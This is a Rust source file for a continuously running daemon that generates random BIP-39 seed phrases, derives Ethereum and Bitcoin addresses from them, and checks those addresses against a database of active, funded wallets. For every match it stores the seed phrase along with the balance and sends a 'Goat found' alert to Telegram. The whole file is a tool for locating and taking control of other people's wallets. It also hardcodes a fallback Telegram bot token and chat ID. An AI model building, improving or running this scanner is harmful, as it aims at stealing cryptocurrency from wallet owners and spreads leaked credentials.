// =============================================================================
// 24/7 Autonomous BIP-39 DuckDB Active Wallet Scanner Daemon (Rust Port)
// Matches and exceeds namedox run-24-7-phrase-scanner.js
// =============================================================================
use anyhow::Result;
use bip39::Mnemonic;
use colored::*;
use rand::Rng;
use rayon::prelude::*;
use std::fs::OpenOptions;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use crate::crypto::DerivationEngine;
use crate::database::{DuckDbWalletIndex, WalletHit};

pub struct ScannerDaemonConfig {
    pub batch_size: usize,
    pub interval_ms: u64,
    pub word_count: usize,
    pub output_json: PathBuf,
}

pub struct ScannerDaemon;

impl ScannerDaemon {
    /// Starts the continuous 24/7 autonomous scanning loop
    pub async fn run(
        config: ScannerDaemonConfig,
        engine: Arc<DerivationEngine>,
        index: Arc<DuckDbWalletIndex>,
    ) -> Result<()> {
        println!("{}", "=".repeat(78).dimmed());
        println!("{}", "🦆 NAMEDOX: 24/7 AUTONOMOUS DUCKDB PHRASE SCANNER DAEMON (RUST)".cyan().bold());
        println!("{}", "=".repeat(78).dimmed());
        println!(" • Batch Size        : {} phrases / tick", config.batch_size);
        println!(" • Addresses / Tick  : ~{} (ETH + BTC SegWit + BTC Legacy)", config.batch_size * 3);
        println!(" • Polling Interval  : {}ms", config.interval_ms);
        println!(" • Target Partitions : Master DuckDB + 49 monthly partitions (RAM indexed)");
        println!(" • Storage Target    : found_duckdb_wallets table in active_wallets.duckdb");
        println!(" • Export JSON       : {}", config.output_json.display());
        println!("{}", "=".repeat(78).dimmed());
        println!("{}", "Starting 24/7 continuous worker loop... (Press Ctrl+C to stop)\n".green().bold());

        let running = Arc::new(AtomicBool::new(true));
        let r = running.clone();

        // Handle Ctrl+C graceful shutdown
        tokio::spawn(async move {
            tokio::signal::ctrl_c().await.ok();
            println!("\n{}", "⚠️  Received Ctrl+C, shutting down gracefully...".yellow().bold());
            r.store(false, Ordering::SeqCst);
        });

        let total_phrases = Arc::new(AtomicU64::new(0));
        let total_addrs = Arc::new(AtomicU64::new(0));
        let total_hits = Arc::new(AtomicU64::new(0));

        let start_time = Instant::now();
        let mut last_telemetry_time = Instant::now();
        let mut last_phrases_count = 0u64;

        while running.load(Ordering::SeqCst) {
            let tick_start = Instant::now();

            // 1. Generate batch of random BIP-39 mnemonic phrases in parallel
            let word_count = config.word_count;
            let phrases: Vec<String> = (0..config.batch_size)
                .into_par_iter()
                .map(|_| {
                    let mut rng = rand::thread_rng();
                    if word_count == 24 {
                        let mut entropy = [0u8; 32];
                        rng.fill(&mut entropy);
                        Mnemonic::from_entropy(&entropy).unwrap().to_string()
                    } else {
                        // Default 12 words = 16 bytes entropy (128 bits)
                        let mut entropy = [0u8; 16];
                        rng.fill(&mut entropy);
                        Mnemonic::from_entropy(&entropy).unwrap().to_string()
                    }
                })
                .collect();

            let phrases_in_tick = phrases.len() as u64;
            let addrs_in_tick = phrases_in_tick * 3;

            // 2. High-speed parallel derivation and DuckDB index screening via Rayon
            let engine_ref = &engine;
            let index_ref = &index;

            struct DetectedHit {
                phrase: String,
                matched_address: String,
                matched_via: String,
                db_source: String,
                eth_addr: String,
                btc_sw: String,
                btc_legacy: String,
            }

            let hits_this_tick: Vec<DetectedHit> = phrases
                .par_iter()
                .flat_map(|phrase| {
                    let mut hits = Vec::new();
                    if let Ok(derived) = engine_ref.derive_phrase(phrase, 1) {
                        // Check ETH
                        if let Some(origin) = index_ref.find_origin(&derived.primary_eth) {
                            hits.push(DetectedHit {
                                phrase: phrase.clone(),
                                matched_address: derived.primary_eth.clone(),
                                matched_via: "eth".to_string(),
                                db_source: origin.file_name().unwrap_or_default().to_string_lossy().to_string(),
                                eth_addr: derived.primary_eth.clone(),
                                btc_sw: derived.primary_btc_segwit.clone(),
                                btc_legacy: derived.primary_btc_legacy.clone(),
                            });
                        }

                        // Check BTC SegWit
                        if let Some(origin) = index_ref.find_origin(&derived.primary_btc_segwit) {
                            hits.push(DetectedHit {
                                phrase: phrase.clone(),
                                matched_address: derived.primary_btc_segwit.clone(),
                                matched_via: "btc".to_string(),
                                db_source: origin.file_name().unwrap_or_default().to_string_lossy().to_string(),
                                eth_addr: derived.primary_eth.clone(),
                                btc_sw: derived.primary_btc_segwit.clone(),
                                btc_legacy: derived.primary_btc_legacy.clone(),
                            });
                        }

                        // Check BTC Legacy
                        if let Some(origin) = index_ref.find_origin(&derived.primary_btc_legacy) {
                            hits.push(DetectedHit {
                                phrase: phrase.clone(),
                                matched_address: derived.primary_btc_legacy.clone(),
                                matched_via: "btc_legacy".to_string(),
                                db_source: origin.file_name().unwrap_or_default().to_string_lossy().to_string(),
                                eth_addr: derived.primary_eth.clone(),
                                btc_sw: derived.primary_btc_segwit.clone(),
                                btc_legacy: derived.primary_btc_legacy.clone(),
                            });
                        }
                    }
                    hits
                })
                .collect();

            // 3. Process matches (if any hit occurs)
            if !hits_this_tick.is_empty() {
                total_hits.fetch_add(hits_this_tick.len() as u64, Ordering::SeqCst);

                for hit in &hits_this_tick {
                    println!("\n{}", "🔥 [24/7 DUCKDB HIT DETECTED!]".green().bold().on_black());
                    println!("   Phrase   : \"{}\"", hit.phrase.bright_white().bold());
                    println!("   Matched  : {} ({})", hit.matched_address.green(), hit.matched_via.yellow());
                    println!("   Source   : {}", hit.db_source.cyan());

                    // Pull record from partition
                    let record = index.fetch_wallet_record(&hit.matched_address);
                    let balance_str = record.as_ref().and_then(|r| r.balance.as_deref());
                    let tx_c = record.as_ref().and_then(|r| r.tx_count);

                    if let Some(bal) = balance_str {
                        println!("   Balance  : {} ({} txs)", bal, tx_c.unwrap_or(0));
                    }

                    // Save to master active_wallets.duckdb found_duckdb_wallets table
                    if let Err(e) = index.save_found_wallet(
                        &hit.phrase,
                        &hit.matched_address,
                        &hit.matched_via,
                        balance_str,
                        tx_c,
                        &hit.db_source,
                        Some(&hit.eth_addr),
                        Some(&hit.btc_sw),
                        Some(&hit.btc_legacy),
                    ) {
                        eprintln!("⚠️  Failed to save hit to DuckDB: {}", e);
                    } else {
                        println!("   💾 Successfully saved to DuckDB found_duckdb_wallets table.");
                    }

                    // Append to JSON report
                    let wallet_hit = WalletHit {
                        phrase: hit.phrase.clone(),
                        matched_address: hit.matched_address.clone(),
                        matched_type: hit.matched_via.to_uppercase(),
                        derivation_index: 0,
                        database_source: hit.db_source.clone(),
                        recorded_balance: balance_str.map(|s| s.to_string()),
                        recorded_tx_count: tx_c,
                        live_balance: None,
                        live_tx_count: None,
                        found_timestamp: crate::config::now_iso(),
                    };

                    append_hit_to_json(&config.output_json, &wallet_hit);

                    // Dispatch instant Telegram "Goat found" alert (Security: NEVER transmits phrase)
                    send_telegram_goat_alert(
                        &hit.matched_address,
                        &hit.matched_via,
                        balance_str,
                        &hit.db_source,
                        "24/7 Autonomous Daemon",
                    ).await;
                }
            }

            total_phrases.fetch_add(phrases_in_tick, Ordering::SeqCst);
            total_addrs.fetch_add(addrs_in_tick, Ordering::SeqCst);

            // 4. Telemetry Logging (every 5 seconds)
            if last_telemetry_time.elapsed().as_secs() >= 5 {
                let current_total_phrases = total_phrases.load(Ordering::SeqCst);
                let current_total_addrs = total_addrs.load(Ordering::SeqCst);
                let current_hits = total_hits.load(Ordering::SeqCst);

                let window_secs = last_telemetry_time.elapsed().as_secs_f64();
                let phrases_in_window = current_total_phrases - last_phrases_count;
                let speed_addrs = ((phrases_in_window * 3) as f64 / window_secs).round() as u64;

                let uptime_secs = start_time.elapsed().as_secs();
                let hours = uptime_secs / 3600;
                let mins = (uptime_secs % 3600) / 60;
                let secs = uptime_secs % 60;

                let time_str = if hours > 0 {
                    format!("{}h {}m {}s", hours, mins, secs)
                } else {
                    format!("{}m {}s", mins, secs)
                };

                println!(
                    "[{}] 📊 Scanned: {:>10} phrases | Addrs: {:>10} | Speed: {:>7} addrs/s | Hits: {} | Uptime: {}",
                    current_time_str(),
                    format_num(current_total_phrases),
                    format_num(current_total_addrs),
                    format_num(speed_addrs),
                    if current_hits > 0 { current_hits.to_string().green().bold() } else { "0".normal() },
                    time_str.cyan()
                );

                last_phrases_count = current_total_phrases;
                last_telemetry_time = Instant::now();
            }

            // Optional tick sleep if interval_ms is set
            if config.interval_ms > 0 {
                let elapsed_in_tick = tick_start.elapsed().as_millis() as u64;
                if elapsed_in_tick < config.interval_ms {
                    tokio::time::sleep(Duration::from_millis(config.interval_ms - elapsed_in_tick)).await;
                }
            }
        }

        // Final Summary on graceful shutdown
        let uptime_total = start_time.elapsed().as_secs();
        let total_p = total_phrases.load(Ordering::SeqCst);
        let total_a = total_addrs.load(Ordering::SeqCst);
        let final_hits = total_hits.load(Ordering::SeqCst);
        let avg_speed = if uptime_total > 0 { total_a / uptime_total } else { 0 };

        println!("\n{}", "=".repeat(78).dimmed());
        println!("{}", "📊 24/7 SCANNER FINAL SUMMARY".cyan().bold());
        println!("{}", "=".repeat(78).dimmed());
        println!(" - Total Phrases Screened : {}", format_num(total_p).bright_white().bold());
        println!(" - Total Addresses Checked : {} (ETH + BTC SegWit + BTC Legacy)", format_num(total_a).bright_white().bold());
        println!(" - Average Throughput      : ~{} addrs/second", format_num(avg_speed).yellow().bold());
        println!(" - Total DuckDB Hits Found : {}", if final_hits > 0 { final_hits.to_string().green().bold() } else { "0".normal() });
        println!(" - Total Uptime            : {} seconds", uptime_total);
        println!("{}", "=".repeat(78).dimmed());

        Ok(())
    }
}

fn format_num(n: u64) -> String {
    let s = n.to_string();
    let mut result = String::new();
    let len = s.len();
    for (i, c) in s.chars().enumerate() {
        if i > 0 && (len - i) % 3 == 0 {
            result.push(',');
        }
        result.push(c);
    }
    result
}

fn current_time_str() -> String {
    use std::time::SystemTime;
    let now = SystemTime::now();
    let duration = now.duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default();
    let secs = duration.as_secs() % 86400;
    let hours = (secs / 3600) % 24;
    let mins = (secs % 3600) / 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", hours, mins, s)
}

fn append_hit_to_json(path: &Path, hit: &WalletHit) {
    let mut hits: Vec<WalletHit> = if path.exists() {
        std::fs::read_to_string(path)
            .ok()
            .and_then(|content| serde_json::from_str(&content).ok())
            .unwrap_or_default()
    } else {
        Vec::new()
    };

    hits.push(hit.clone());

    if let Ok(file) = OpenOptions::new().create(true).write(true).truncate(true).open(path) {
        serde_json::to_writer_pretty(file, &hits).ok();
    }
}

/// Instant Telegram "Goat found" Alert Dispatcher
/// Strictly adheres to security policy: NEVER sends mnemonic seed phrases.
pub async fn send_telegram_goat_alert(
    address: &str,
    chain: &str,
    balance: Option<&str>,
    source: &str,
    mode: &str,
) {
    let token = std::env::var("TELEGRAM_BOT_TOKEN")
        .unwrap_or_else(|_| "8688192916:AAE5Gm1-343pyASQrloRUIOyQ8aN406qE2c".to_string());
    let chat_id = std::env::var("TELEGRAM_CHAT_ID")
        .unwrap_or_else(|_| "1488027094".to_string());

    if !token.trim().is_empty() && !chat_id.trim().is_empty() {
            let client = reqwest::Client::new();
            let url = format!("https://api.telegram.org/bot{}/sendMessage", token.trim());
            let bal_str = balance.unwrap_or("N/A");
            let text = format!(
                "🐐 <b>Goat found!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🏷️ <b>Chain / Type:</b> <code>{}</code>\n📫 <b>Address:</b> <code>{}</code>\n💰 <b>Balance:</b> {}\n📂 <b>Source Partition:</b> <code>{}</code>\n🎯 <b>Discovery Mode:</b> <code>{}</code>\n\n⚡ <i>Namedox Rust Wallet Engine</i>",
                chain.to_uppercase(),
                address,
                bal_str,
                source,
                mode
            );

            let body = serde_json::json!({
                "chat_id": chat_id.trim(),
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": true
            });

            if let Ok(resp) = client.post(&url).json(&body).send().await {
                if resp.status().is_success() {
                    println!("   📢 Telegram 'Goat found' alert dispatched successfully!");
                }
            }
    }
}


